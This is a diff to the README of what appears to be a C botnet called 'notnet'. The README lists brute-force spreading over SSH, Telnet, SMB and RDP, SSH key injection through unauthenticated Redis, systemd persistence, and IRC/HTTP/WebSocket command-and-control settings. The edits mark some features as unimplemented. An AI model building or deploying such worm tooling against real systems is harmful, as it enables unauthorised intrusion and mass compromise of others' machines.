@@ -7,7 +7,8 @@ A research-purpose botnet written in pure C, designed to replicate across hetero
 - **Pure C**: Compiles and runs on any system with a C compiler and network stack
 - **Hybrid C2**: Dual protocol support (IRC + HTTP/WebSocket) for maximum compatibility
 - **Multi-vector spreading**: SSH, Telnet, SMB, Redis, RDP
-- **Peer-to-peer daisychain**: C2 fallback via peer relay using DNS discovery
+- **Peer-to-peer daisychain**: (planned, not yet implemented) — peer DNS
+  discovery exists, but no peer relay or C2 fallback through peers yet
 - **Modern + classic**: On-target compilation, systemd persistence, alongside IRC command channels and brute-force spreading
 
 ## Architectures
@@ -34,16 +35,16 @@ repository build system. Do not treat them as available targets.
 
 | Target  | Method |
 |---------|--------|
-| SSH     | Password brute-force, post-exploitation payload deployment |
-| Telnet  | Password brute-force, post-exploitation payload deployment |
+| SSH     | Password brute-force, post-exploitation payload deployment (banner-based; effective against legacy/test services, not modern key-exchange SSH) |
+| Telnet  | Password brute-force, post-exploitation payload deployment (banner-based; effective against legacy/test services) |
 | SMB     | Login brute-force (auth confirmation only) |
 | Redis   | Unauthenticated write, SSH key injection |
 | RDP     | Brute-force, credential reuse (auth confirmation only) |
 
 ## Payload Delivery
 
-1. Direct binary download from C2 (preferred)
-2. On-target compilation from embedded source tarball (fallback)
+1. Direct binary download from C2 (preferred), verified by SHA-256 pin
+2. On-target compilation from embedded source tarball (planned, not yet implemented)
 
 ## Commands
 
@@ -68,10 +69,16 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `irc_channel` | `#notnet` | IRC channel to join |
 || `irc_pass` | *(none)* | IRC password (or `NOTNET_IRC_PASS` env var) |
 || `irc_auth_nicks` | *(none)* | Comma-separated authorized operator nicks |
+|| `irc_enabled` | auto | 0/1 — explicitly enable/disable IRC C2 |
 || `http_server` | `api.notnet.net` | HTTP C2 server |
 || `http_port` | `443` | HTTP C2 port |
+|| `http_enabled` | auto | 0/1 — explicitly enable/disable HTTP C2 |
 || `ws_server` | `ws.notnet.net` | WebSocket C2 server |
 || `ws_port` | `443` | WebSocket C2 port |
+|| `ws_enabled` | auto | 0/1 — explicitly enable/disable WS C2 |
+|| `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
+|| `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
+|| `redis_ssh_key` | *(none)* | SSH public key injected into Redis authorized_keys (or `NOTNET_REDIS_SSH_KEY` env var) |
 || `scan_interval` | `30` | Seconds between scan cycles |
 || `ssh_enabled` | `1` | Enable SSH spreading |
 || `telnet_enabled` | `1` | Enable Telnet spreading |
